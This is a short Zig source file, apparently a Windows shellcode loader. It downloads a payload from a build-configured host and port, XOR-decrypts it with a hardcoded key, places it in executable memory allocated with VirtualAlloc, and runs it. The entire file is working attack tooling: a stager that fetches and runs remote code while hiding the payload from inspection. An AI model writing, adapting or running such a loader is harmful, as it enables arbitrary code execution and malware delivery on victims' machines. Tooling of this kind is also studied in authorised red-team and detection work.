const std = @import("std");
const build_options = @import("build_options");
const helpers = @import("helpers.zig");
const windows = std.os.windows;

const KEY = "ziggoon"; // change this

pub fn main() !void {
    var gpa = std.heap.GeneralPurposeAllocator(.{}){};
    defer _ = gpa.deinit();
    const allocator = gpa.allocator();

    std.debug.print("[+] starting download from {s}:{d}\n", .{ build_options.host, build_options.port });

    const shellcode = try helpers.download(allocator, build_options.host, build_options.port, build_options.size);
    defer allocator.free(shellcode);

    std.debug.print("[+] shellcode downloaded. size: {d}\n", .{shellcode.len});
    helpers.xor(shellcode, KEY);
    std.debug.print("[+] shellcode decrypted\n", .{});

    const memory = try windows.VirtualAlloc(null, shellcode.len, windows.MEM_COMMIT, windows.PAGE_EXECUTE_READWRITE);
    @memcpy(@as([*]u8, @ptrCast(memory))[0..shellcode.len], shellcode);

    std.debug.print("[+] memory allocated at address: 0x{x}\n", .{@intFromPtr(memory)});
    std.debug.print("[+] executing shellcode\n", .{});

    const func: *const fn () callconv(.C) i32 = @ptrCast(memory);
    _ = func();
}
